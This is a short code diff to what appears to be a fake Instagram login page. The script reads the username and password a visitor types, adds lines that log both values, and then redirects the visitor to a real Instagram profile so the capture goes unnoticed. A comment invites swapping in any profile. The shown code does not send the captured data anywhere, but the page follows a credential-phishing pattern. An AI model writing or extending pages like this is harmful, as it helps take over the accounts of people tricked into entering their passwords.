@@ -65,9 +65,15 @@
 
   <script>
     function redirectUser(event) {
-      event.preventDefault();
-       const user = document.getElementById("username").value;
-    const pass = document.getElementById("password").value;
+      event.preventDefault(); // Stop default submit
+       
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+
+      console.log("📥 Username entered:", user);
+      console.log("🔐 Password entered:", pass);
+
+      // redirect to real Insta profile
       window.location.href = "https://instagram.com/marsha_cute_bea"; // Replace with any Insta profile
     }
   </script>
